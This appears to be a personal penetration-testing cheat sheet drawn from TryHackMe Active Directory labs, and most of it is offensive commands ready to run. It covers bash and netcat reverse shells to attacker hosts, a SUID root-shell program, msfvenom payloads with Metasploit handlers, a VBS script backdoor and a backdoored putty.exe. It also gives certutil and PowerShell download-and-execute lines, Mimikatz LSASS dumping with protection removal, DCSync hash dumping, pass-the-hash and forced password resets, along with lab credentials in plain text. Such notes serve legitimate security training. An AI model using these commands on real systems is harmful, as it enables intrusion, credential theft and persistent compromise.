./view -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' ->execute setuid Linux
 
##########
Reverse Shell simple Bash Script:
#!/bin/bash
bash -i >& /dev/tcp/10.10.62.51/4545 0>&1

Reverse Shell Generator:
    ->https://www.revshells.com/
########## 
 
As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job:

####################
####################

SUID Escalation Linux
scrypt: c.c
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    int main(void){
            setuid(0);
            setgid(0);
            system("/bin/bash -p");
            return 0;
    }

cmd:
    gcc c.c -o code
    chmod +x c.c

####################
####################

Remotely Creating Services Using sc:

    Metasploit Reverse shell:
        ->msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe

    We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:
        ->smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

    Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from msfconsole:
        ->msfconsole
        ->msf6 > use exploit/multi/handler
        ->msf6 exploit(multi/handler) > set LHOST AttakerIP
        ->msf6 exploit(multi/handler) > set LPORT 4444
        ->msf6 exploit(multi/handler) > set payload windows/shell/reverse_tcp
        ->msf6 exploit(multi/handler) > exploit 


        ->nc -lvp 4443

    Since sc.exe doesn't allow us to specify credentials as part of the command, we need to use runas to spawn a new shell with t1_leonard.summer's access token.
    Windows Machine>runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"

    And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:
        ->C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
        ->C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249

    After checl the listener on "msfconsole"

####################
####################

Lateral Movement using MSI payload:
    Creating our MSI payload
        ->msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstallerPyaloadName.msi

    We then copy the payload using SMB or any other method available:
        ->smbclient -c 'put myinstallerPyaloadName.msi' -U userName -W ZA '//thmiis.za.tryhackme.com/admin$/' Password

    Since we copied our payload to the ADMIN$ share, it will be available at C:\Windows\ on the server.

    We start a handler to receive the reverse shell from Metasploit:
        ->msfconsole
        ->msf6 > use exploit/multi/handler
        ->msf6 exploit(multi/handler) > set LHOST AttakerIP
        ->msf6 exploit(multi/handler) > set LPORT 4445
        ->msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
        ->msf6 exploit(multi/handler) > exploit 

    Let's start a WMI session against THMIIS from a Powershell console:
        PS C:\> $username = 'userNam';
        PS C:\> $password = 'Password';
        PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
        PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
        PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
        PS C:\> $Session = New-Cimsession -ComputerName <ComputerName> -Credential $credential -SessionOption $Opt -ErrorAction Stop


        We then invoke the Install method from the Win32_Product class to trigger the payload:
        Powershell
        PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstallerPyaloadName.msi"; Options = ""; AllUsers = $false}

####################
####################

Backdoring:
Backdooring .vbs Scripts
As an example, if the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script:
    ->CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True

This will copy nc64.exe from the share to the user's workstation %tmp% directory and send a reverse shell back to the attacker whenever a user opens the shared VBS script.


Backdooring .exe Files
If the shared file is a Windows binary, say putty.exe, you can download it from the share and use msfvenom to inject a backdoor into it. 
The binary will still work as usual but execute an additional payload silently. 

To create a backdoored putty.exe, we can use the following command:
    ->msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. 
Once the file has been generated, we can replace the executable on the windows share and wait for any connections using the exploit/multi/handler module from Metasploit.

####################
####################

In Windows VIctim Download File:
        certutil -urlcache -f http://x.x.x.x:8080/FileName  FileName<- We can change the neame of the exe that will be downloaded locally
            or
        certutil.exe -urlcache -f http://x.x.x.x:8080/FileName  FileName

Simple SCP from Windows Victim Machine to ATTAK Machine Kali:
    scp FileNAme <Username>@<KALI IP>:/FilePAth/ .


####################
MIMIKATZ - LSASS DUMP MEMORY (Check: Check: AD -> Credentials Harversting -> Local Security Authority Subsystem Service LSASS.txt)
####################

Runing mimikatz With Admin Privielges
    C:\Tools\Mimikatz> mimikatz.exe

Before dumping the memory for cashed credentials and hashes, we need to enable the SeDebugPrivilege and check the current permissions for memory access. 
It can be done by executing:
    privilege::debug command as follows:

    mimikatz # privilege::debug
        Privilege '20' OK

Failing to Dump Stored Password Due to the LSA Protection
        mimikatz # sekurlsa::logonpasswords
            ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

The command returns a 0x00000005 error code message (Access Denied). 
Lucky for us, Mimikatz provides a mimidrv.sys driver that works on kernel level to disable the LSA protection. We can import it to Mimikatz by executing "!+" as follows,

Loading the mimidrv Driver into Memory
    mimikatz # !+

Removing the LSA Protection:
    mimikatz # !processprotect /process:lsass.exe /remove



####################
Mimikatz:Dumping Memory for Credentials Manager (Check: AD -> Credentials Harversting -> Windows Credential Manager.txt)
####################

C:\Users\Administrator>c:\Tools\Mimikatz\mimikatz.exe
    mimikatz # privilege::debug
    Privilege '20' OK

    mimikatz # sekurlsa::credman


####################
DC Sync:Impacket DE-HASH (Check: AD -> Credentials Harversting -> Dumping Domain Controller.txt)
####################

The DC Sync Attack to Dump NTLM Hashes in KALI:
        user@machine$ python3.9 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/<AD_Admin_User>@MACHINE_IP
        
        Once we obtained hashes, we can either use the hash for a specific user to impersonate him or crack the hash using Cracking tools, such hashcat. 
            
            
        We can use the hashcat -m 1000 mode to crack the Windows NTLM hashes as follows:
        Cracking the Hashes in KALI:
            user@machine$ hashcat -m 1000 -a 0 /path/to/ntlm_hashes.txt /path/to/wordlist/such/as/rockyou.txt

####################
RUNAS 
####################

If we have the AD credentials in the format of :, we can use Runas, a legitimate Windows binary, to inject the credentials into memory:
        -ex: runas.exe /netonly /user:<domain>\<username> cmd.exe
            Let's look at the parameters:

            /netonly - Since we are not domain-joined, we want to load the credentials for network authentication but not authenticate against a domain controller. 
                So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the account specified here.

            /user - Here, we provide the details of the domain and the username. It is always a safe bet to use the Fully Qualified Domain Name (FQDN).

            cmd.exe - This is the program we want to execute once the credentials are injected. This can be changed to anything, but the safest bet is cmd.exe since you can then use that to launch whatever you want, with the credentials injected.
    
####################
AD Enumeration Scan
####################
    Scan Network:
        nmap -Pn --script smb-vuln* -p139,445 10.200.24.101
        nmap -Pn -sV --top-ports 50 --open <ip> -vv
        nmap -n -sV --script"ldap* and not brute" -p 389 10.200.24.101

    List Guess access on SMB:
        smbmap -u ""-p"" -P 445 -H 10.200.24.101
        smbmap -H <ip> -u anonymous -R #Recursive search

        smbclient -U '%' -L //10.200.24.101
        smbclient -U 'guest%' -L //10.200.24.101

    FInd DC IP:
        nslookup -type=SRV _ldap._tcp.dc.msdcs.za.tryhackme.com

    
    
    Enumerateldap: ldapsearch -x -h 10.200.24.101 -s base:
        ldapServiceName: za.tryhackme.com:thmdc$@ZA.TRYHACKME.COM
        dnsHostName: THMDC.za.tryhackme.com

    Find User list: net rpc group members 'Domain Users' -W 'ZA.TRYHACKME.COM' -I '10.200.24.101' -U '%'


####################
AD Enumeration Lateral Movement
####################
    evil-winrm -i <ip> -u <svcUser> -p <password>
    evil-winrm -u <> -p <> -i <>



####################
Check DNS for SYSVOL in AD Enumeration
####################
SYSVOL is a folder that exists on all domain controllers. 
It is a shared folder storing the Group Policy Objects (GPOs) and information along with any other domain related scripts. 
It is an "essential component" for Active Directory since it delivers these GPOs to all computers on the domain. 
Domain-joined computers can then read these GPOs and apply the applicable ones, making domain-wide configuration changes from a central location.

Before we can list SYSVOL, we need to configure our DNS. 
Sometimes you are lucky, and internal DNS will be configured for you automatically through DHCP or the VPN connection, but not always. 
It is good to understand how to do it manually. Your safest bet for a DNS server is usually a domain controller. Using the IP of the domain controller, we can execute the following commands in a 

PowerShell window:
    $dnsip = "<Domain Controller IP>" 
    $index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
    Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip

in our Victim's Windows cmd prompt:
        nslookup domainFQDN

    We can use the following command to force a network-based listing of the SYSVOL directory:
        dir \\za.tryhackme.com\SYSVOL\


####################
AD Enumeration via CMD Windows VIctim's machine
##################
Users:
    We can use the net command to list all users in the AD domain by using the user sub-option:
        net user /domain

    We can also use this sub-option to enumerate more detailed information about a single user account:
        net user zoe.marshall /domain

Groups:
    We can use the net command to enumerate the groups of the domain by using the group sub-option:
        C:\>net group /domain

    We could also enumerate more details such as membership to a group by specifying the group in the same command:
        net group "Tier 1 Admins" /domain

Password Policy:
    We can use the net command to enumerate the password policy of the domain by using the accounts sub-option:
        C:\>net accounts /domain

####################
AD Enumeration via CMD PowerShell
##################

->refer to Enumeration_trough_Powershell.txt

!!!!DISCLAIMER!!!!
PowerShell is often monitored more by the blue teams than Command Prompt.
We have to install the AD-RSAT tooling or use other, potentially detectable, scripts for PowerShell enumeration.


####################
BloodHound + SharpHound
##################
!!!!!!!!!!!!!!! Drawbacks !!!!!!!!!!!!!!!!!!!!!
Requires the execution of Sharphound, which is noisy and can often be detected by AV or EDR solutions.
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

What command can be used to execute Sharphound.exe and request that it recovers Session information 
only from the za.tryhackme.com domain without touching domain controllers?

    SharpHound.exe --CollectionMethods Sessions --Domain za.tryhackme.com --ExcludeDCs


####################
AD Exploit 
##################
AddMember:
    Powershell:
        Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"

    verify that the command worked by using the Get-ADGroupMember cmdlet:
       Get-ADGroupMember -Identity "Groupe Name"

If we can:
    ForceChangePassword:
        Get-ADGroupMember -Identity "Tier 2 Admins" : Identify a Victim

    Use the Set-ADAccountPassword AD-RSAT cmdlet to force change the password:
            $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
            Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 

***
Note: If you get an Access Denied error, your permissions have not yet propagated through the domain. 
This can take up to 10 minutes. The best approach is to terminate your SSH or RDP session, take a quick break, and then reauthenticate and try again. 
You could also run gpupdate /force and then disconnect and reconnect, which in certain cases will cause the synchronisation to happen faster.


Which ACE would allow you to update any non-protected parameter of a target object: GenericWrite

PASS THE HASH:
    Get access to the User account via Hash NTLM by using Evil-winrm:
        evil-winrm -i <TargetIP> -u <NLTMUserName> -H <LAST PART OF THE NTLM HASH>



Upload payload from Victim machine: -> Active_Directory/AD_Step4/Exploiting_AD_Users.txt
    You can host your meterpreter shell using a Python webserver and then copy it using something like this form Victim PC:
    certutil.exe -urlcache -split -f http:///shell.ps1

        Split:
            Certutil.exe may download a file from a remote destination using -urlcache. 
            This behavior does require a URL to be passed on the command-line. In addition, -f (force) and -split (Split embedded ASN.1 elements, and save to files) will be used.

    or in case of python3 web server download from:
        cerutlis -urlcache -f http:\\<ATTCK IP MACHINE>:<PORT>/<PayloadName>  <PayloadName>

####################
Powershell Download
##################

to download an exe from powershell on a web server in our Kali machine

    powershell -c 'IEX(New_Object Net.WebClient).DownloadString("http://<KaliIP/exeFile>")'
    powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString('')"




####################
Privilege Escalation Windows
##################
    https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html

    Windows cmd that list Schedule TaskName + Privileges:
    -> schtask /query /fo /LIST /v /TN "TaskName"


####################
SSH connection from Linux Machine to machine in Active Directory
##################
    ssh <Domain Name>\\<AD Username>@<Domain Name>


####################
Powershell Manual Service enum
####################
powershell -ep bypass
What powershell -c command could we run to manually find out the service name? 
        powershell -c Get-Service
